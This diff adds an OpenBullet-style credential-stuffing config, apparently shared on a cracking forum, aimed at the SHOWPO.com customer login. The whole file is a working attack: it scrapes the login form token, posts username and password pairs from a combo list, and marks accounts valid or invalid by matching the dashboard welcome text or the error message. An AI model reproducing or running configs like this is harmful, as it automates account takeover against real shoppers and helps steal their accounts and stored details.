@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "SHOWPO.com FLO#7780",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-31T11:40:03.066428-07:00",
+  "AdditionalInfo": "",
+  "Author": "FLO#7780",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#FLO#7780 REQUEST GET "https://www.showpo.com/us/customer/account/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.showpo.com" 
+  HEADER "referer: https://www.showpo.com/us/customer/account/login/" 
+
+#TOKEN PARSE "<SOURCE>" LR "formKey = \"" "\";" -> VAR "Token" 
+
+#Nulled/GlobalTech REQUEST POST "https://www.showpo.com/us/customer/account/loginPost/" 
+  CONTENT "form_key=<Token>&login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>&send=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.showpo.com" 
+  HEADER "referer: https://www.showpo.com/us/customer/account/login/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Welcome to your dashboard. Here you can update your info and view your past orders." 
+    KEY "Hello," 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login or password." 
+
